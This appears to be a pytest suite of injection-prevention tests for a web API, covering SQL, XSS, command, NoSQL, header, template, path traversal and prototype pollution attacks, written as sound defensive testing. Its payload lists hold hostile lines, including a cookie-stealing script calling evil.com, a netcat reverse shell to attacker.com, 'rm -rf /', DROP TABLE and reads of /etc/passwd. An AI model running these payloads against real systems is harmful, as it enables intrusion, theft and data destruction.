"""
Injection Attack Prevention Tests

These tests verify:
1. SQL injection prevention
2. XSS prevention
3. Command injection prevention
4. NoSQL injection prevention
5. Header injection prevention

Author: Claude Code
Date: 2025-12-23
"""

import pytest
import json
from typing import List, Dict, Any
from utils import APIClient, AuthHelper, AuthToken, extract_list_data
from config import TestConfig


# ============================================================================
# SQL Injection Prevention Tests
# ============================================================================

class TestSQLInjection:
    """Test SQL injection prevention"""

    # Common SQL injection payloads
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1; SELECT * FROM users",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "1' AND '1'='1",
        "' OR 1=1 --",
        "'; WAITFOR DELAY '0:0:5' --",
        "1' OR '1'='1' /*",
        "' OR ''='",
        "1; UPDATE users SET role='admin' --",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
    ]

    @pytest.mark.critical
    @pytest.mark.injection
    def test_login_sql_injection(
        self,
        api_client: APIClient,
        config: TestConfig
    ):
        """
        Verify login endpoint is not vulnerable to SQL injection.

        Attack Vector:
        - Inject SQL in email/password fields
        - Could bypass authentication

        Expected: Injection rejected or safely handled
        """
        for payload in self.SQL_PAYLOADS[:5]:  # Test subset
            response = api_client.post('/api/auth/login-verify-password', json={
                'userEmail': payload,
                'password': 'password',
                'turnstileToken': config.turnstile_token
            })

            # Should not return 200 success
            if response.status_code == 200:
                data = response.json()
                assert not data.get('success'), \
                    f"SQL injection may have succeeded with payload: {payload}"

    @pytest.mark.critical
    @pytest.mark.injection
    def test_user_search_sql_injection(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify user search is not vulnerable to SQL injection.
        """
        for payload in self.SQL_PAYLOADS[:5]:
            response = api_client.post('/api/users/search', auth=admin_token, json={
                'query': payload
            })

            # Should handle safely (error or empty results)
            if response.status_code == 200:
                data = response.json()
                # Should not return unexpected data
                # Use helper to extract users list (supports both old and new formats)
                users = extract_list_data(data, 'users')
                # SQL injection shouldn't return all users
                assert len(users) < 100, \
                    f"SQL injection may have exposed all users with payload: {payload}"

    @pytest.mark.high
    @pytest.mark.injection
    def test_project_id_sql_injection(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify project ID parameters are not vulnerable to SQL injection.
        """
        injection_ids = [
            "proj_test' OR '1'='1",
            "proj_test'; DROP TABLE projects; --",
            "proj_test UNION SELECT * FROM users",
        ]

        for payload in injection_ids:
            response = api_client.post('/api/projects/get', auth=admin_token, json={
                'projectId': payload
            })

            # Should reject or return not found
            assert response.status_code in [400, 404, 422], \
                f"Unexpected response for SQL injection in projectId: {response.status_code}"

    @pytest.mark.high
    @pytest.mark.injection
    def test_sorting_parameter_injection(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify sorting parameters cannot be used for injection.
        """
        injection_sorts = [
            "createdAt; DROP TABLE users",
            "createdAt DESC, (SELECT password FROM users)",
            "1; --",
        ]

        for payload in injection_sorts:
            response = api_client.post('/api/projects/list', auth=admin_token, json={
                'sortBy': payload,
                'sortOrder': 'desc'
            })

            # Should reject invalid sort field
            assert response.status_code in [200, 400, 422], \
                f"Unexpected error response: {response.status_code}"


# ============================================================================
# XSS Prevention Tests
# ============================================================================

class TestXSSPrevention:
    """Test XSS prevention"""

    XSS_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        "javascript:alert('XSS')",
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '"><img src=x onerror=alert(1)>',
        '<script>fetch("http://evil.com?c="+document.cookie)</script>',
        "'-alert(1)-'",
        '<div style="background:url(javascript:alert(1))">',
        '{{constructor.constructor("alert(1)")()}}',  # Template injection
    ]

    @pytest.mark.critical
    @pytest.mark.injection
    def test_user_profile_xss(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify user profile fields are sanitized against XSS.

        Attack Vector:
        - Store XSS payload in user profile
        - Payload executes when profile is viewed

        Expected: Input sanitized or encoded
        """
        for payload in self.XSS_PAYLOADS[:5]:
            response = api_client.post('/api/users/update', auth=admin_token, json={
                'userName': payload
            })

            if response.status_code == 200:
                # Verify the stored value is sanitized
                profile_response = api_client.post('/api/auth/current-user', auth=admin_token)
                if profile_response.status_code == 200:
                    data = profile_response.json()
                    stored_name = data.get('data', {}).get('userName', '')

                    # Should not contain raw script tags
                    assert '<script>' not in stored_name.lower(), \
                        f"XSS payload stored without sanitization: {stored_name}"

    @pytest.mark.high
    @pytest.mark.injection
    def test_project_name_xss(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify project name is sanitized against XSS.
        """
        for payload in self.XSS_PAYLOADS[:3]:
            response = api_client.post('/api/projects/create', auth=admin_token, json={
                'projectData': {
                    'projectName': payload,
                    'projectDescription': 'Test project'
                }
            })

            # Should either reject or sanitize
            if response.status_code == 200:
                data = response.json()
                project_id = data.get('data', {}).get('projectId')

                if project_id:
                    # Check stored value
                    get_response = api_client.post('/api/projects/get', auth=admin_token, json={
                        'projectId': project_id
                    })

                    if get_response.status_code == 200:
                        project_data = get_response.json()
                        stored_name = project_data.get('data', {}).get('project', {}).get('projectName', '')
                        assert '<script>' not in stored_name.lower(), \
                            "XSS payload stored in project name"

    @pytest.mark.high
    @pytest.mark.injection
    def test_comment_content_xss(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify comment content is sanitized against XSS.
        """
        for payload in self.XSS_PAYLOADS[:3]:
            response = api_client.post('/api/comments/create', auth=admin_token, json={
                'submissionId': 'sub_test',
                'content': payload
            })

            # Check if XSS is properly handled
            if response.status_code == 200:
                data = response.json()
                # Response should have sanitized content
                content = str(data)
                assert '<script>' not in content.lower(), \
                    "XSS payload in comment response"

    @pytest.mark.medium
    @pytest.mark.injection
    def test_search_query_xss(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify search queries don't reflect XSS payloads.
        """
        for payload in self.XSS_PAYLOADS[:3]:
            response = api_client.post('/api/users/search', auth=admin_token, json={
                'query': payload
            })

            if response.status_code == 200:
                # Response should not reflect unsanitized payload
                response_text = response.text
                assert '<script>' not in response_text, \
                    "XSS payload reflected in search response"


# ============================================================================
# Command Injection Prevention Tests
# ============================================================================

class TestCommandInjection:
    """Test command injection prevention"""

    COMMAND_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`whoami`",
        "$(whoami)",
        "; rm -rf /",
        "| nc -e /bin/sh attacker.com 4444",
        "&& curl http://attacker.com",
        "\n/bin/sh",
        "'; cat /etc/passwd; echo '",
    ]

    @pytest.mark.critical
    @pytest.mark.injection
    def test_file_name_command_injection(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify file names cannot be used for command injection.

        Attack Vector:
        - Upload file with malicious filename
        - Filename processed by shell command

        Expected: Filenames sanitized
        """
        for payload in self.COMMAND_PAYLOADS[:5]:
            # Try to use malicious filename
            response = api_client.post('/api/submissions/upload-url', auth=admin_token, json={
                'projectId': 'proj_test',
                'fileName': payload,
                'fileType': 'application/pdf'
            })

            # Should reject or sanitize
            if response.status_code == 200:
                data = response.json()
                # Filename should be sanitized
                signed_url = data.get('data', {}).get('signedUrl', '')
                assert ';' not in signed_url and '|' not in signed_url, \
                    f"Malicious filename may have been accepted: {payload}"

    @pytest.mark.high
    @pytest.mark.injection
    def test_export_filename_injection(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify export filenames cannot be used for injection.
        """
        for payload in self.COMMAND_PAYLOADS[:3]:
            response = api_client.post('/api/projects/export', auth=admin_token, json={
                'projectId': 'proj_test',
                'filename': payload
            })

            # Should reject malicious filenames
            if response.status_code == 200:
                data = response.json()
                filename = data.get('data', {}).get('filename', '')
                assert ';' not in filename and '|' not in filename and '`' not in filename, \
                    "Command injection payload in filename"


# ============================================================================
# NoSQL Injection Prevention Tests
# ============================================================================

class TestNoSQLInjection:
    """Test NoSQL injection prevention (applicable if using KV or similar)"""

    NOSQL_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "1==1"}',
        '{"$regex": ".*"}',
        '{"$or": [{"a": 1}, {"b": 1}]}',
        "'; return true; var dummy='",
    ]

    @pytest.mark.high
    @pytest.mark.injection
    def test_json_parameter_nosql_injection(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify JSON parameters cannot be used for NoSQL injection.
        """
        for payload in self.NOSQL_PAYLOADS[:3]:
            try:
                # Try to inject NoSQL operators
                response = api_client.post('/api/auth/current-user', auth=admin_token, json={
                    'userId': payload
                })

                # Should not process NoSQL operators
                assert response.status_code in [200, 400, 404, 422], \
                    f"Unexpected response for NoSQL injection: {response.status_code}"

            except Exception:
                pass  # JSON parsing may fail for some payloads

    @pytest.mark.medium
    @pytest.mark.injection
    def test_query_object_injection(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify query objects cannot contain NoSQL operators.
        """
        malicious_queries = [
            {'$gt': ''},
            {'$ne': None},
            {'email': {'$regex': '.*'}},
        ]

        for query in malicious_queries:
            response = api_client.post('/api/users/search', auth=admin_token, json={
                'filters': query
            })

            # Should reject or ignore NoSQL operators
            if response.status_code == 200:
                data = response.json()
                users = data.get('data', {}).get('users', [])
                # Should not return all users
                assert len(users) < 100, \
                    "NoSQL injection may have returned all users"


# ============================================================================
# Header Injection Prevention Tests
# ============================================================================

class TestHeaderInjection:
    """Test HTTP header injection prevention"""

    @pytest.mark.high
    @pytest.mark.injection
    def test_crlf_injection_in_headers(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify CRLF injection is prevented in headers.

        Attack Vector:
        - Inject CRLF sequences in user-controlled headers
        - Could inject additional headers or split response

        Expected: CRLF sequences rejected or sanitized
        """
        crlf_payloads = [
            "test\r\nX-Injected: true",
            "test\nSet-Cookie: admin=true",
            "test%0d%0aX-Injected: true",
            "test%0aSet-Cookie: admin=true",
        ]

        for payload in crlf_payloads:
            # Try to inject via custom header value
            try:
                response = api_client.post(
                    '/api/auth/current-user',
                    auth=admin_token,
                    headers={'X-Custom': payload}
                )

                # Check response doesn't contain injected headers
                assert 'X-Injected' not in response.headers, \
                    "CRLF injection successful"

            except Exception:
                pass  # May fail due to invalid header

    @pytest.mark.medium
    @pytest.mark.injection
    def test_host_header_injection(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify Host header manipulation is prevented.
        """
        # This is typically handled at the infrastructure level
        # but we test that the app doesn't trust arbitrary Host headers

        response = api_client.post(
            '/api/auth/current-user',
            auth=admin_token,
            headers={'Host': 'evil.com'}
        )

        # Should either reject or ignore malicious Host
        # Response URLs should not use attacker's domain
        if response.status_code == 200:
            data = response.json()
            response_text = str(data)
            assert 'evil.com' not in response_text, \
                "Host header injection reflected in response"


# ============================================================================
# Template Injection Prevention Tests
# ============================================================================

class TestTemplateInjection:
    """Test server-side template injection prevention"""

    TEMPLATE_PAYLOADS = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '{{constructor.constructor("return this")()}}',
        '{{config}}',
        '{{self.__class__.__mro__}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
    ]

    @pytest.mark.high
    @pytest.mark.injection
    def test_template_injection_in_user_input(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify template syntax is not evaluated in user input.
        """
        for payload in self.TEMPLATE_PAYLOADS[:5]:
            response = api_client.post('/api/users/update', auth=admin_token, json={
                'userName': payload
            })

            if response.status_code == 200:
                # Check if template was evaluated
                profile_response = api_client.post('/api/auth/current-user', auth=admin_token)
                if profile_response.status_code == 200:
                    data = profile_response.json()
                    stored_name = data.get('data', {}).get('userName', '')

                    # Should not contain evaluated result (49 for 7*7)
                    if payload == '{{7*7}}':
                        assert stored_name != '49', \
                            "Template injection: expression was evaluated"


# ============================================================================
# Path Traversal Prevention Tests
# ============================================================================

class TestPathTraversal:
    """Test path traversal prevention"""

    PATH_PAYLOADS = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc/passwd',
        '/etc/passwd',
        'file:///etc/passwd',
    ]

    @pytest.mark.critical
    @pytest.mark.injection
    def test_file_path_traversal(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify file paths cannot traverse directories.

        Attack Vector:
        - Use ../ sequences to access sensitive files
        - Could expose system files or application secrets

        Expected: Path traversal blocked
        """
        for payload in self.PATH_PAYLOADS[:5]:
            response = api_client.post('/api/submissions/get', auth=admin_token, json={
                'filePath': payload
            })

            # Should not return file contents
            if response.status_code == 200:
                data = response.json()
                content = str(data)

                # Should not contain /etc/passwd content
                assert 'root:' not in content, \
                    f"Path traversal successful with: {payload}"

    @pytest.mark.high
    @pytest.mark.injection
    def test_attachment_path_traversal(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify attachment downloads prevent path traversal.
        """
        for payload in self.PATH_PAYLOADS[:3]:
            response = api_client.post('/api/submissions/download', auth=admin_token, json={
                'submissionId': 'sub_test',
                'fileName': payload
            })

            # Should reject traversal attempts
            assert response.status_code in [400, 403, 404, 422], \
                f"Path traversal may be possible: {payload}"


# ============================================================================
# Prototype Pollution Prevention Tests
# ============================================================================

class TestPrototypePollution:
    """Test JavaScript prototype pollution prevention"""

    POLLUTION_PAYLOADS = [
        {'__proto__': {'admin': True}},
        {'constructor': {'prototype': {'admin': True}}},
        {'__proto__': {'isAdmin': True}},
        {'constructor': {'prototype': {'isAdmin': True}}},
    ]

    @pytest.mark.high
    @pytest.mark.injection
    def test_prototype_pollution_in_json(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify JSON parsing prevents prototype pollution.

        Attack Vector:
        - Send __proto__ or constructor.prototype in JSON
        - Could modify Object prototype and gain privileges

        Expected: Pollution payloads rejected or ignored
        """
        for payload in self.POLLUTION_PAYLOADS:
            response = api_client.post('/api/users/update', auth=admin_token, json=payload)

            # Check that user hasn't gained admin privileges
            profile_response = api_client.post('/api/auth/current-user', auth=admin_token)
            if profile_response.status_code == 200:
                data = profile_response.json()
                user = data.get('data', {})

                # Admin property should not be set from __proto__
                assert not user.get('admin'), \
                    "Prototype pollution may have set admin property"

    @pytest.mark.medium
    @pytest.mark.injection
    def test_deep_object_pollution(
        self,
        api_client: APIClient,
        admin_token: str
    ):
        """
        Verify deep object merging prevents pollution.
        """
        deep_payload = {
            'settings': {
                '__proto__': {
                    'admin': True
                }
            }
        }

        response = api_client.post('/api/users/update-settings', auth=admin_token, json=deep_payload)

        # Should not pollute prototype
        if response.status_code == 200:
            data = response.json()
            assert not data.get('admin'), \
                "Deep prototype pollution may have succeeded"


# ============================================================================
# Helper for running injection tests
# ============================================================================

if __name__ == '__main__':
    """Run injection tests directly"""
    pytest.main([__file__, '-v', '-m', 'injection', '--tb=short'])
